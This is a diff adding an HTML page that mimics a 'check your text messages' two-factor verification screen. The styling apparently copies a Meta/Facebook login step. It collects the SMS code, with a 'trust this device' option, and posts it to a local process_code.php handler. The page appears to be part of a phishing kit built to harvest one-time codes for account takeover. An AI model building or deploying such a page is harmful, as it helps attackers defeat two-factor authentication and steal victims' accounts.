@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check Your Text Messages</title>
+    <style>
+         body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('bg.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+        }
+
+
+        .container {
+          font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('bg.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+        }
+
+        .container img {
+            width: 330px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin: 0;
+        }
+
+        p {
+            font-size: 16px;
+            text-align: center;
+            color: #BBBBBB;
+        }
+
+        form {
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        input[type="text"] {
+            width: 95%;
+            position: center;
+            padding: 15px;
+            top: 650px ;
+            font-size: 1rem;
+            border: 1px solid #475a6b;
+            border-radius: 8px;
+            background-color: #1c2a33;
+            color: white;
+        }
+        input[type="text"]::placeholder {
+            color: #AAAAAA;
+        }
+
+        .timer {
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #BBBBBB;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: start;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        .checkbox-container label {
+            font-size: 14px;
+            color: #BBBBBB;
+        }
+
+        button {
+            width: 98%;
+            padding: 12px;
+            position: center;
+            
+            background-color: #0064e0;
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #007dc1;
+        }
+
+
+       button.try {
+    width: 87%;
+    padding: 12px;
+    margin-top: 10px;
+    background-color: transparent; /* Transparent background */
+    border: 0.5px solid white; /* Blue border */
+    border-radius: 25px;
+    color: white; /* Blue text */
+    font-size: 1rem;
+    cursor: pointer;
+}
+
+button.try:hover {
+    background-color: rgba(0, 149, 246, 0.1); /* Slight blue background on hover */
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+              <h1>Check your text messages</h1>
+                      <p >Enter the code that we sent to the registered mobile number. </p>
+        <img src="code.jpeg" alt="Shield Icon">
+        <form action="process_code.php" method="POST">
+            <input type="text" id="code" name="code" placeholder="Code" required>
+                    <p class="timer">We can send a new code in <span id="countdown">1:30</span>.</p>
+            <div class="checkbox-container">
+                <input type="checkbox" id="trust" name="trust">
+                <label for="trust">Trust this device and skip this step from now on</label>
+            </div>
+            <button type="submit">Continue</button>
+        </form>
+        <button class="try">Try another way</button>
+    </div>
+    <script>
+        // Countdown Timer
+        let countdownElement = document.getElementById('countdown');
+        let timeLeft = 120; // 90 seconds (1:30)
+
+        function updateCountdown() {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+
+            // Format time to always show two digits for seconds
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+
+            // Update the countdown text
+            countdownElement.textContent = `${minutes}:${seconds}`;
+
+            // Decrement time left
+            if (timeLeft > 0) {
+                timeLeft--;
+            } else {
+                clearInterval(timer); // Stop the timer when it reaches 0
+            }
+        }
+
+        // Start the countdown timer
+        let timer = setInterval(updateCountdown, 1000);
+    </script>
+</body>
+</html>
+
